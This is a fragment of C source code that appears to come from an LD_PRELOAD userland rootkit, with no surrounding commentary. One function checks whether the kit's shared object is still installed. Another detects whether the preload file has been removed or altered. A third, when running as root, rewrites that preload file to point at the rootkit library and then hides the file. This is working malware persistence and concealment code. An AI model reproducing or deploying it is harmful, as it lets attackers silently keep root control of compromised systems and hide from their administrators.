int rknomore(void){
    DIR *dp;
    struct dirent *dir;
    int status = 1;

    hook(COPENDIR, CREADDIR);

    dp = call(COPENDIR, INSTALL_DIR);
    if(dp == NULL) // if we cant open installdir, rk-is-no-more
        return status;

    while((dir = call(CREADDIR, dp)) != NULL){
        if(!strncmp(".", dir->d_name, 1))
            continue;

        // if we can detect the kits shared object, rk-is-more
        if(strstr(dir->d_name, BDVLSO)){
            status = -1;
            break;
        }
    }
    closedir(dp);

    return status;
}

int preload_inconsistent(void){ // returns 1 if something is wrong with the preload file.
    struct stat preloadstat;
    int status = 0,
        statret;

    hook(C__XSTAT);
    memset(&preloadstat, 0, sizeof(stat));
    statret = (long)call(C__XSTAT, _STAT_VER, PRELOAD_FILE, &preloadstat);

    if((statret < 0 && errno == ENOENT) || preloadstat.st_size != strlen(SOPATH))
        status = 1;

    return status;
}

void reinstall(void){
    if(geteuid() != 0) return;
    if(rknomore()) return;
    if(!preload_inconsistent()) return;

    hook(CFOPEN, CFWRITE);
    FILE *ldfp = call(CFOPEN, PRELOAD_FILE, "w");

    if(ldfp != NULL){
        call(CFWRITE, SOPATH, strlen(SOPATH), 1, ldfp);
        fflush(ldfp);
        fclose(ldfp);

        hide_path(PRELOAD_FILE);
    }

    return;
}
